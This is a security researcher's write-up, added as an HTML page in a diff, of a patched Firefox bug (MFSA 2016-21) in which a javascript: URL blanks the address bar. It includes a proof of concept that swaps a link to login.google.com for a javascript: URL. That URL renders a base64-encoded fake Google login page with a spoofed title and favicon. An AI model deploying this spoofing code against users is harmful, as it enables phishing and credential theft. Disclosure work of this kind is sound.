@@ -1,0 +1,73 @@
+<!doctype html>
+<html>
+<head>
+	<title>FireFox Hide URL (FIXED) - Abdulrahman Al-Qabandi</title>
+	<link href="../q.css" rel="stylesheet">
+	
+
+</head>
+<body>
+<div id="qLogo"><img src="../q.png"/>
+<div id="qNav">
+<a href="../">Home</a>
+<a href="../About">About</a>
+<a href="../Tools">Tools</a>
+<a href="../Links">Links</a>
+<a href="https://www.twitter.com/qab" target="_BLANK">Twitter</a>
+<a href="../Stuff">Stuff</a>
+
+</div>
+</div>
+
+
+
+<div id="qWriteup">
+<h1>FireFox Hide URL (FIXED)</h1>
+<br>
+
+<p>
+The Javascript URL scheme in Firefox is quite peculiar than other browsers' implementation. For example, navigating to 'javascript:1' in Firefox causes the document to display the number '1'<br>
+
+<br>
+This behavior is not seen in other browsers. The way it works is that Firefox checks if there is something returned, if so, it will display this text which is returned in the document.
+But what happens if we navigate to 'javascript:`&#x3C;b&#x3E;test&#x3C;/b&#x3E;`'?<br>
+It will return that string and ultimately we will have a document with custom HTML rendered through javascript. <br>
+But, rendering HTML means we can render javascript within a javascript URL scheme by navigating to something like 'javascript:`&#x3C;script&#x3E;alert(/this works!/)&#x3C;/script&#x3E;`'
+<br>
+Using the above, I stumbled upon a weird behavior where when certain javascript is used we can trick the browser into completely showing a blank address URL. 
+<h2>Original PoC code:</h2>
+</p><br>
+<!-- HTML generated using hilite.me --><div class="qCode" style=" overflow:auto;width:auto;border:solid gray;border-width:.1em .1em .1em .8em;padding:.2em .6em;"><pre style="margin: 0; line-height: 125%"><span style="color: #000080; font-weight: bold">&lt;html&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;head&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;title&gt;</span>FF-URL-hiding - @qab<span style="color: #000080; font-weight: bold">&lt;/title&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/head&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;body&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;a</span> <span style="color: #FF0000">id=</span><span style="color: #0000FF">&#39;q&#39;</span> <span style="color: #FF0000">href=</span><span style="color: #0000FF">&#39;https://login.google.com/&#39;</span><span style="color: #000080; font-weight: bold">&gt;</span>Click here<span style="color: #000080; font-weight: bold">&lt;/a&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;script&gt;</span>
+<span style="color: #000080; font-weight: bold">var</span> payload=btoa(<span style="color: #0000FF">&#39;&lt;head&gt;&lt;script&gt;q=1;setTimeout($=&gt;{location.reload()},12)&lt;\/script&gt;&lt;/head&gt;&#39;</span>);
+<span style="color: #000080; font-weight: bold">var</span> payload2=(<span style="color: #0000FF">&#39;PGgyPldsZWNvbWUgdG8gQWxwaGFiZXQgTG9naW4hPC9oMj4KPHNjcmlwdD4KKGZ1bmN0aW9uKCkgey8vVGhpcyBpcyB0byBzZXQgdGhlIGZhdmljb24KICAgIHZhciBxID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnbGluaycpOwogICAgcS50eXBlID0gJ2ltYWdlL3gtaWNvbic7CiAgICBxLnJlbCA9ICdzaG9ydGN1dCBpY29uJzsKICAgIHEuaHJlZiA9ICdodHRwOi8vd3d3Lmdvb2dsZS5jb20vZmF2aWNvbi5pY28nOwogICAgZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ2hlYWQnKVswXS5hcHBlbmRDaGlsZChxKTsKfSgpKTsKCndpbmRvdy5kb2N1bWVudC50aXRsZT0naHR0cHM6Ly9sb2dpbi5nb29nbGUuY29tLyc7CnNldFRpbWVvdXQocnI9Pntsb2NhdGlvbi5oYXNoPScnfSwxMCk7Cjwvc2NyaXB0Pg==&#39;</span>);;
+<span style="color: #000080; font-weight: bold">var</span> ql=<span style="color: #0000FF">&#39;javascript:try{q}catch(e){document.write(atob(&quot;&#39;</span>+payload2+<span style="color: #0000FF">&#39;&quot;))};`&lt;script&gt;if(location!=this.location){q=window}else{document.write(atob(&quot;&#39;</span>+payload+<span style="color: #0000FF">&#39;&quot;))}&lt;\/script&gt;`&#39;</span>;
+q.addEventListener(<span style="color: #0000FF">&quot;click&quot;</span>,$=&gt;{q.href=ql;});<span style="color: #008800; font-style: italic">//We replace the href right before the user clicks it.</span>
+<span style="color: #000080; font-weight: bold">&lt;/script&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/body&gt;</span>
+<span style="color: #000080; font-weight: bold">&lt;/html&gt;</span>
+</pre></div>
+
+<br>
+<br>
+<p>
+I was able to find another bug using the javascript URI scheme whilst testing this bug which resulted in full URL spoof, writeup can be found <a href="#">here</a>
+<h2>References:</h2>
+<b>The Bugzilla report:</b> <a href="https://bugzilla.mozilla.org/show_bug.cgi?id=1228754" target="_blank">https://bugzilla.mozilla.org/show_bug.cgi?id=1228754</a>
+<br>
+<b>Mozilla Foundation Security Advisory 2016-21:</b> <a href="https://www.mozilla.org/en-US/security/advisories/mfsa2016-21/" target="_blank">https://www.mozilla.org/en-US/security/advisories/mfsa2016-21/</a>
+
+</p>
+</div>
+
+	<script type="application/javascript" src="../q.js">
+
+	
+	</script>
+</body>
+</html>
